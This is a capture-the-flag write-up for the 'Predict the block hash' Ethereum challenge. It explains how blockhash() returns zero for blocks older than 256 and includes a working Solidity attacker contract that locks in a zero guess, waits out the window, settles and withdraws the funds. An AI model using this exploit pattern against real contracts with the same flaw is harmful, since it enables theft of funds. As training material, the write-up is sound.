# Predict the block hash Capturetheether

## Goals

=> Guessing an 8-bit number is apparently too easy. This time, you need to predict the entire 256-bit block hash for a future block.

### Hints

- None

### Solution

- The vulnerability is that there is no time limit on when you have to use the `settle()` function, and since only the blockhash of the most recent 256 blocks are availible as stated in the solidity docs: "The block hashes are not available for all blocks for scalability reasons. You can only access the hashes of the most recent 256 blocks, all other values will be zero." and trying to get the blockhash of a block which we can't acces will always translate to `0x0000000000000000000000000000000000000000000000000000000000000000` we just need to place our guess like that and then wait the next block + 256 other blocks and we will win the challenge.

- A big help was the solidity docs and trying to `console.logBytes32(blockhash(block.number + 1))` which obviously also translates to `0x0000000000000000000000000000000000000000000000000000000000000000`.

- I started up a local hardhat node and tried it with this contract and advancing the block.number by calling the `increaseBlock()` function 265 times after `placeGuess()` and it was succesful.

### Attacker Contract

```solidity
contract Hack {
    PredictTheBlockHashChallenge predictContract;
    uint256 blockCounter;

    constructor(address _predictContract) {
        predictContract = PredictTheBlockHashChallenge(_predictContract);
    }

    receive() external payable {}

    function placeGuess() public payable {
        bytes32 answer = 0x0000000000000000000000000000000000000000000000000000000000000000;
        predictContract.lockInGuess{value: 1 ether}(answer);
    }

    function increaseBlock() external {
        // increase blockCount in local hardhat node running
        blockCounter++;
    }

    function attack() public {
        predictContract.settle();
    }

    function withdrawStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```
